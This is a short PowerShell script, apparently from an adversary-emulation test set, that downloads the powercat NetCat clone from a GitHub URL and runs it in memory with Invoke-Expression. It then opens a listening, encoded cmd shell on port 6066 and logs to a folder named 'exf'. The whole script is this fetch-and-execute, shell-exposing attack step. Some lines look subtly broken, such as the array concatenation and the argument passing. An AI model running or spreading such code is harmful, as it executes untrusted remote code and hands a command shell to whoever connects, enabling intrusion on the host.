# Downloads and Run PowerCat
# NetCat in PowerShell
# Technic ID : xxx
Clear-Host
Write-Output "==============================================================================="
Write-Output "Downloads and use powercat.ps1 to open en encoded reverse shell  (Txxx)"
Write-Output "==============================================================================="
################ [ List of commpiled programs to downlad ] ################
$Ps1ScriptToUse = @("powercat.ps1")
$ExecuteFrom = "https://raw.githubusercontent.com/besimorhino/powercat/master"
$PwCatParameters = " -l -p 6066 -e cmd -ge"
################ [ GLOBAL VARIABLES ] ################
$TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
$LogFile = "$env:PUBLIC\exf\Tool_PowerCat.txt";
################ [ MAIN BODY ] ################
Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Force
Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-output "Script : $PSCommandPath has been launched on $TimeStamp" | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
foreach ($Tool in $Ps1ScriptToUse) 
{
    $DownloadRun = $ExecuteFrom+"/"+$Ps1ScriptToUse
    $RemoteCode = (Invoke-WebRequest -Uri $DownloadRun -UseBasicParsing).Content
    Invoke-Expression -Command $RemoteCode $PwCatParameters
  }